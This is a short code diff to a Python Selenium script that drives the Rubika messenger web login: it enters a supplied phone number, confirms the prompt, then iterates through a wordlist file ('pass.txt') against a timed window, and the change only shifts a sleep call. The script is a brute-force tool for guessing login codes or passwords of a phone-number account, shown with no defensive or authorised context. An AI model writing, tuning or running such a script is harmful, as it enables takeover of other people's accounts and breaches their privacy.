@@ -20,12 +20,13 @@ def Rubika():
         Number_CellPhone.replace(' ','')
     drive=wb.Firefox()
     drive.get('https://web.rubika.ir/#/login')
+    time.sleep(2)
     drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[2]/div[2]/input').send_keys(Number_CellPhone)
     drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[1]/div/a').click()
     time.sleep(.3)
     drive.find_element_by_xpath('/html/body/div/app-root/app-modal-container/div/app-modal-view/div/div/div/app-confirm-custom/div/div[2]/button[2]/span').click()
-    time.sleep(2)
     stop=time.time()+61
+    time.sleep(2)
     with open('./pass.txt','r') as passlist:
         for i in passlist.read().split():
             if stop<=time.time():
